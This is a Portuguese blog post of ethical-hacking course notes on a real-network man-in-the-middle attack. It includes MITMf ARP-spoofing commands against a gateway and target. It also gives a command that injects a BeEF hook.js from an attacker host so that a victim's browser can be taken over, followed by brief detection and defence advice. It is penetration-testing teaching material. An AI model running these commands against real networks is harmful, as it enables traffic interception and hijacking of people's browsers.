@@ -1,0 +1,79 @@
+-------------
+LINK ORIGINAL > https://cybersecurityleituras.blogspot.com/2017/07/mitm-ataque-real-consideracoes.html
+-------------
+
+MITM ataque real – considerações
+MITM ataque real – considerações
+Verificar video no curso Introdução à Ética Hacker no site
+https://www.udemy.com/introducao-a-ethical-hacker/?instructorPreviewMode=guest
+Seção 7 - Network Penetration Test.
+Afonso Alves
+
+O texto abaixo são anotações que facilitam a fixação das sequências e configurações.
+
+Redes reais - Certifique-se de especificar o IP certo e de estar na mesma rede do alvo.
+Máquina Kali - rede nat desligada.
+ifconfig para verificar isso.
+Estou desligando-me na rede - problema de dns ou conexão muito lenta ou perda de conexão pode acontecer.
+Desconecte-se da sua rede virtual seja bridge ou nat.
+Dispositivos - rede - desmarque o adaptador de rede
+Ifconfig etho não está conectado com a máquina principal - não podemos fazer ping
+- Agora conectado à mesma máquina que você está atacando – ao roteador.
+- Você não pode usar sua placa sem fio interna - apenas com external wireless.
+- Conecte seu cartão sem fio - wlan0 - cartão sem fio - ainda não conectado.
+- Precisamos nos conectar à mesma rede.
+- Esta duas placas sem fio estão conectadas à mesma sub-rede ou subnet.
+- Temos a chance de ver o Mac address do Router do alvo.
+Comando  - mitmf -arp -spoof -i wlan0 -gateway 192.168.0.1 -target 192.168.0.19
+- Estamos usando wlan0 - roteador de gateway e alvo
+arp –a para checar se o arp address foi modificado
+- A mudança leva tempo na camada de endereço MAC
+- Mitmf está sniffing dados quando o alvo atualiza a primeira página após o comando ser executado.
+
+Revisão
+- Certifique-se de estar conectado à mesma rede
+- Não usar bridge ou nat na sua máquina virtual
+- Desligue sua máquina kali para a rede nat.
+- A máquina Kali tem que ser isolada para conectar ao homem no meio
+- Depois de terminar com isso, apenas conectar novamente ao seu adaptador de rede. Eth0 tem agora um endereço IP conectado ao seu computador.
+
+-----
+IMAGE > https://3.bp.blogspot.com/-0P9jQbYwSgw/WXqfBdrBdCI/AAAAAAAASpk/tTkYN7_W5WUw2SZQGxn1Bghu-8yC-n-3wCLcBGAs/s1600/disconnect%2Bthe%2Badapter.PNG
+-----
+
+Imagem da configuração necessária para acontecer o MITMf, você deve estar desconectado de sua máquina virtual.
+
+-----
+IMAGE > https://1.bp.blogspot.com/-3IhSmBWQOp8/WXqe7dhSc9I/AAAAAAAASpg/00AObZ4ir143DI9ywb-rMOjiiXseI_6xgCEwYBhgL/s1600/mifmf.PNG
+-----
+
+Aqui o comando complete onde o que poderá mudar aqui no seu computador é o wlan0 fornecido pelo seu Kali e os dois IPs – um do Router/gateway e o outro do target/alvo.
+
+Se o MITMf não estiver instalado, execute o comando abaixo.
+Se a ferramenta MITMf não vem instalada com o Kali Linux. Ela deve ser instalado separadamente usando o seguinte comando:
+apt-get install mitmf
+Certifique-se de ter os repositórios corretos definidos no arquivo sources.list presente na pasta /etc/apt/ , uma vez que a instalação da ferramenta exigiria alguns arquivos adicionais para resolver o problema de dependências, que pode ser encontrado nos seguintes links:
+deb http://http.kali.org/kali kali main non-free contrib
+deb http://security.kali.org/kali-security kali/updates main contrib non-free
+deb-src http://http.kali.org/kali kali main non-free contrib
+deb-src http://security.kali.org/kali-security kali/updates main contrib non-free
+Uma vez instalada a ferramenta, identifique o endereço IP da vítima e o gateway padrão. A máquina Kali Linux atuará como o tráfego do homem-em-meio ao ataque e redireciona os dois pontos finais.
+--- Daqui para frente é um complemento para entender que MITM pode ser feito de um outro jeito envolvendo outro programa que trabalharemos em outra aula, isto é, veremos na prática como fazer este gancho com um js(javaScript).
+Injetando o gancho/hook BeEF usando MITM
+O comando completo que executaria a falsificação de ARP e também configuraria MITMf para injetar o URL é mostrado da seguinte maneira:
+mitmf -i eth0 --arp --spoof --gateway 192.168.1.123 --target 192.168.1.22 - inject -js-url http://192.168.1.70:3000/hook.js
+Esse comando gerará a seguinte saída:
+
+-----
+IMAGE > https://4.bp.blogspot.com/-zmg6-ZNG7sw/WXqe3LaOGPI/AAAAAAAASpc/bAfFysRVLCktpQ0-L1j6rUVjPxNLjcChwCLcBGAs/s1600/mitmf.PNG
+-----
+
+Assim que o cliente envia uma solicitação para uma página da Web, você verá alguma atividade gerada na interface da ferramenta. No painel BEEF UI, você encontrará o navegador on-line e pronto para ser assumido. Através do método MITM, você poderia injetar o gancho Beeb em todos os sites que você poderia pensar, assim recebendo dados que são enviados de volta do servidor, ainda mais que e o navegador do cliente não tem como identificar os dados injetados.
+
+A única maneira de identificar se um gancho BeEF foi injetado no arquivo HTML no final do cliente é exibindo a fonte(código fonte) pressionando Ctrl + U no navegador. Quando o código abre em um editor de texto, Procure a palavra-chave hook.js (ou examine cuidadosamente todo o arquivo). Você certamente encontrará O URL do JavaScript injetado nela.
+
+BeEF realiza a maior parte do ataque ao permanecer sob a superfície sem muita interação e envolvimento do usuário final. O navegador da Web é um software amplamente utilizado e as vulnerabilidades são descobertas diariamente, o que só aumenta a importância desta ferramenta em seu arsenal. A maioria dos módulos de ataque incluídos no BeEF usa JavaScript legítimo para consultar o navegador da Web e o sistema operacional. Embora o Chrome e o Internet Explorer tenham filtros anti-XSS, não são defesas infalíveis contra esses ataques.
+A maneira de bloquear esses ataques é educando os usuários para ter cuidado ao navegar na internet e evitar visitar sites suspeitos. A maioria desses ataques começa por uma campanha de phishing tentando atrair o usuário a visitar o site injetado com o gancho Beeb. Você também precisa desinfetar os sites da sua organização de todos os XSS e falhas de injeção ou seu próprio site poderá ter o gancho BeEF injetado. Para o ataque baseado em MITM, certifique-se de que a camada de rede esteja corretamente segura, ou então você terá maiores problemas nas suas mãos do que apenas uma injeção no site com o gancho do Beeb.
+
+Referencias:
+Penetration Testing: A Survival Guide.2016 Packt Publishing. Authors:Wolf Halton, Bo Weaver, Juned Ahmed Ansari, Srinivasa Rao Kotipalli,Mohammed A. Imran.
